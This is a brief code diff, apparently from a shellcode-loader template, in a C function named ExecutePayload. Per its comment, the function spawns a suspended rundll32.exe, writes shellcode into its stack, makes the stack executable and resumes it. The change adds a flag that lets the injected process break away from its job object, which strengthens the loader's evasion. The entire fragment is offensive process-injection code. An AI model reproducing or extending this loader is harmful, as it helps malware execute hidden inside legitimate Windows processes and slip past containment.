@@ -112,7 +112,7 @@ void ExecutePayload(void) {
 
 	if (Synchronize()) {
 		// Create a suspended process, write shellcode into stack, make stack RWX, resume it
-		if (CreateProcess(NULL, "rundll32.exe", NULL, NULL, TRUE, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
+		if (CreateProcess(NULL, "rundll32.exe", NULL, NULL, TRUE, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS|CREATE_BREAKAWAY_FROM_JOB, NULL, NULL, &si, &pi)) {
 			ctx.ContextFlags = CONTEXT_INTEGER|CONTEXT_CONTROL;
 			GetThreadContext(pi.hThread, &ctx);
 
